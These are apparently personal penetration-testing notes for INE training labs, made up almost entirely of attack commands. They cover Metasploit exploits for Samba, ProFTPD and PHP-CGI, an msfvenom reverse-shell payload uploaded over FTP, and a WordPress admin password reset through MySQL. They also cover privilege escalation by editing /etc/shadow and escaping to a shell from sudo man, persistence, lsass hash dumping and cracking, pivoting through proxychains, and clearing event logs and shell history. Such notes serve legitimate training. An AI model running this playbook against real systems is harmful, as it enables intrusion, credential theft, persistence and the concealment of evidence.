nmap -sV -sC -p 3306 demo.ine.local
```

```
searchsploit MySQL 5.5
```

```
use auxiliary/scanner/mysql/mysql_login
```

after we got creds


```
show databases;
```

```
use wordpress;
```

```
show tables;
```

```
select * from wp_users;
```

```
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
```

___________
USE FTP FOR PAYLOAD UPLOAD 

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.44.3 LPORT=1234 -f aspx > payload.aspx
```

```
ftp> put /root/payload.aspx ./payload.aspx
local: /root/payload.aspx remote: ./payload.aspx
229 Entering Extended Passive Mode (|||49413|)
125 Data connection already open; Transfer starting.
100% |*******************************************|  3709       45.93 MiB/s    --:-- ETA
226 Transfer complete.
3709 bytes sent in 00:00 (1.19 MiB/s)
ftp> 

```

```
use exploit(multi/handler)
```

exec payload using browser

```
http://target.ine.local/payload.apsx

```

_______

## PHP Version 5.2.4

chech for phpinfo.php

if it have php 5.2.4

then use can use 

```
searchsploit php cgi
```

```
PHP 5.3.12/5.4.2 - CGI Argument Injection (Metasploit)                                                                                            | php/remote/18834.rb

```

```
USE exploit(multi/http/php_cgi_arg_injection)
```

______________

## Samba 3.0.20-Debian

```
use exploit/multi/samba/usermap_script
```

___________

## ProFTPD 1.3.5

```
use exploit/unix/ftp/proftpd_modcopy_exec

msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html/
SITEPATH => /var/www/html/


```


__________________

## PRIV ESC - linux

```
find / -perm -4000 -type f 2>/dev/null
```

___________

### check internal network
```
netstat -a 
```

__________

#### Enumerating System Information - Windows

```
sysinfo
```

```
shell
hostname
systeminfo

```

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```


___


#### Enumerating Users & Groups - Windows

```
getuid
```

```
getprivs
```

```
use post/windows/gather/enum_logged_on_users
```

shell

```
net users
```

```
net user administrator
```

```
net localgroup
```

```
net localgroup administrators
```

__________

#### Enumerating Network Information - Windows

```
ipconfig
```

```
ipconfig /all
```

```
route print
```

```
arp -a
```

```
netstat -ano
```

_______

#### Enumerating Processes and Services

```
ps
```

```
pgrep explorer.exe
```

We can enumerate a list of running services by spawning a command shell session and running the following command:

```
net start
```

We can learn more about the running services by running the following command:
```
wmic service list brief
```

we can also enumerate a list of running tasks and the corresponding services for each task

```
tasklist /SVC
```

enumerate is the list of scheduled tasks on the Windows target
```
schtasks /query /fo LIST
```

_______

#### Automating Windows Local Enumeration

```
use exploit/windows/winrm/winrm_script_exec
```

```
use post/windows/gather/win_privs
```

```
use post/windows/gather/enum_logged_on_users
```

```
use post/windows/gather/checkvm
```

```
use post/windows/gather/enum_applications
```

```
use post/windows/gather/enum_computers
```

```
use post/windows/gather/enum_patches
```

USE : **https://github.com/411Hall/JAWS**

copy AND PASTE SCRIPT IN INE LAB AND EXECUTE.

______

______
#### Enumerating System Information - Linux


```
cat /etc/issue
cat /etc/*release
```

```
sysinfo
hostname
```

Linux kernel running on the target

```
uname -a
```

We can identify hardware information regarding the CPU being used on the target system by running the following command:

```
lscpu
```

We can view the list of storage devices attached to the Linux system and information regarding their respective mount points and storage capacity by running the following command:

```
df -h
```

_______
#### Enumerating Users & Groups - Linux

```
getuid
```

```
groups root
```

```
cat /etc/group
```

We can get a list of other user and service accounts on the Linux system by running the following command:

```
cat /etc/passwd
```

We can enumerate a list og groups present on the system by running the following command:

```
groups
```

We can view the users that are currently logged in by running the following command:

```
who
```

We can also get a list of users of have recently logged in to the system by running the following command:

```
lastlog
```

________

#### Enumerating Network Information - Linux

Enumerating network information.
```
ifconfig
```

We can get a list of open ports on the target system by running the following meterpreter command:

```
netstat
```

Another important piece of information to obtain is the routing table, this can be done by running the following command:

```
route
```

We can also enumerate the list of configured networks and their subnets by running the following command:

```
cat /etc/networks

```

we can enumerate the list of locally mapped domains and their respective IP addresses by displaying the content of the /etc/hosts file.

```
cat /etc/hosts
```

In order to identify the default DNS name server address, we can run the following command:
```
cat /etc/resolv.conf
```

_________

#### Enumerating Processes and Cron Jobs

Enumerating processes & cron jobs.

```
ps
```

We can also find the PID of a specific service by running the following command:
```
pgrep vsftpd
```

We can enumerate the list of cron jobs on the Kali Linux system by running the following command:
```
ls -al /etc/cron*
```

____________

#### Automating Linux Local Enumeration

we can use the enum_configs module to enumerate various configuration files stored on the target system.

```
use post/linux/gather/enum_configs
```

We can use the enum_network module to automate the enumeration of networking information from the target system.

```
use post/linux/gather/enum_network
```

enum_system module which can be used to automate the enumeration of local system information.

```
use post/linux/gather/enum_system
```

## **Automating local enumeration with LinEnum

GitHub repository: https://github.com/rebootuser/LinEnum

copy script and chmod +x linpri.sh 

exec

____________
## **Linux Privilege Escalation

#### Permissions Matter!

```
find / -not -type l -perm -o+w
```

```
ls -l /etc/shadow
cat /etc/shadow
```

Observe that the root password is not set. Adding a known password in the shadow file can escalate to root. Use openssl to generate a password entry.
```
openssl passwd -1 -salt abc password
```

Copy the generated entry and add it to the root record in /etc/shadow

```
vim /etc/shadow
```

After making the changes, try to switch to the root user.
```
su
```

__________

#### Editing Gone Wrong

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

No anomaly is there. Move on to finding misconfigured sudo. Check the current sudo capabilities.
```
sudo -l
```

The man entry depicts that the man command can be run using sudo without providing any password. Run it and launch /bin/bash from it.

```
sudo man ls
```

```
!/bin/bash
```


____________
## Windows Persistence

```
use exploit/windows/local/persistence_service
```

works on meterpreter shell

```
run getgui -e -u alice -p hack_123321
```

_______

## Linux Persistence

```
scp student@demo.ine.local:~/.ssh/id_rsa .
```

```
chmod 400 id_rsa
ssh -i id_rsa student@demo.ine.local
```


Check the running processes.

```
ps -eaf
```


```
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
crontab -i cron
crontab -l
```

____________

#### Windows: NTLM Hash Crackin

```
migrate -N lsass.exe
```

```
hashdump
```

```
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

____________


## **ICACLS

Common rights:

| Permission | Meaning        |
| ---------- | -------------- |
| F          | Full control   |
| M          | Modify         |
| RX         | Read & Execute |
| R          | Read-only      |
| W          | Write-only     |

Remove all permissions for a user

```
icacls C:\Test /remove UserName
```


**Remove inheritance**

```
icacls C:\Test /inheritance:r
```


Removes inherited permissions (only explicit ones remain).

Options for inheritance:

- `:r` → remove inheritance
    
- `:e` → enable inheritance
    
- `:d` → disable inheritance and copy inherited ACEs

___________

## **PrintSpoofer64.exe 

**post-exploitation
## What it is (high level)

- PrintSpoofer is an exploit/utility (32- and 64-bit builds are available) that targets weaknesses in the **Windows Print Spooler** / token-impersonation flows. It leverages a user/process that has **SeImpersonatePrivilege** (or similar impersonation rights) to obtain a SYSTEM token and spawn processes as SYSTEM. [GitHub+1](https://github.com/itm4n/PrintSpoofer?utm_source=chatgpt.com)
    

## How it works (conceptual, non-actionable)

- The tool interacts with the Print Spooler service to perform privileged file/operation actions and to cause a privileged process to impersonate a token the attacker can use.
    
- Once a SYSTEM token is acquired, it uses Windows APIs (e.g., CreateProcessAsUser-like functionality) to execute a command as SYSTEM.
    
- This is related to the same family of Print Spooler vulnerabilities broadly categorized as **PrintNightmare** (multiple CVEs and follow-up patches). Patches and configuration changes have been released by Microsoft; defenders should assume this class of attacks remains relevant where systems are unpatched or misconfigured. [NVD+1](https://nvd.nist.gov/vuln/detail/cve-2021-34527?utm_source=chatgpt.com)
    

## Why this matters

- If successful it yields **local privilege escalation** to SYSTEM (the most powerful local account). Attackers use tools like this in post-exploitation to pivot, persist, or drop payloads across a network. Major advisories and vendors flagged Print Spooler vulnerabilities as critical (CVE series: PrintNightmare)
___________

#### Password Cracker: Linux

```
use post/linux/gather/hashdump
``` 


```
use auxiliary/analyze/crack_linux
```

```
set SHA512 true
```

_________

#### Pivoting

ok 

TWO targets

```
10.5.19.191    demo1.ine.local
10.5.25.189    demo2.ine.local
```

we got initila foothold on `demo1.ine.local`

using rejetto

now check 

```
ping 10.5.25.189
```

yes i can communicate

check 
```
ipconfig
```

netmask is `255.255.255.240`

now add route to 10.5.25.189

**meterpretre shell
```
run autoroute -s 10.5.25.0/20
```

perform tcp scan 

```
use auxiliary/portscan/tcp
```

```
use sockproxy module 

set SVRPORT 9050
set VERSION 4a
```

now run nmap

```
proxychains nmap -Pn -sT -sV -p80 demo2.ine.local
```

i got BADblue

search badblue on metasploit 

i got shell

____________

## Clearing Windows Event logs.

```
clearev
```

____

## **** Clearing tracks on Linux.

```
history -c
```

```
cat /dev/null > ~/.bash_history
```

_______

# **Web Application Penetration Testing**

https://medium.com/@aditya.deshpande7575/web-application-penetration-testing-ctf-1-90cc9ddf99c6

